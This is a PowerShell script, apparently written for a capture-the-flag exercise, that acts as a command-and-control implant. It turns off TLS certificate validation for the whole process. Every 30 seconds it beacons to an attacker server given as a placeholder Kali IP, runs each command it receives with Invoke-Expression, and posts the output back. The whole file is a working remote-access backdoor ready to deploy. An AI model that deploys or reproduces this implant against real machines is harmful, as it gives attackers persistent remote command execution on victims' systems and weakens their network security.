# payload.ps1 - lives in your GitHub repo

$C2      = "https://YOUR_KALI_IP"
$Secret  = "your-ctf-team-secret"
$Token   = [System.Security.Cryptography.SHA256]::Create().ComputeHash(
               [System.Text.Encoding]::UTF8.GetBytes($Secret)
           ) | ForEach-Object { $_.ToString("x2") } | Join-String

$AgentId = $env:COMPUTERNAME
$Headers = @{ "X-Agent-Token" = $Token; "Content-Type" = "application/json" }

# Ignore self-signed cert on your Kali box
add-type @"
using System.Net; using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert,
        WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll

while ($true) {
    try {
        $body = @{ id = $AgentId; result = $null } | ConvertTo-Json
        $resp = Invoke-RestMethod -Uri "$C2/beacon" -Method POST `
                    -Headers $Headers -Body $body
        if ($resp.cmd) {
            $output = try { Invoke-Expression $resp.cmd 2>&1 | Out-String } catch { $_.Exception.Message }
            $body2  = @{ id = $AgentId; result = $output } | ConvertTo-Json
            Invoke-RestMethod -Uri "$C2/beacon" -Method POST -Headers $Headers -Body $body2
        }
    } catch { }
    Start-Sleep -Seconds 30    # beacon interval - adjust as needed
}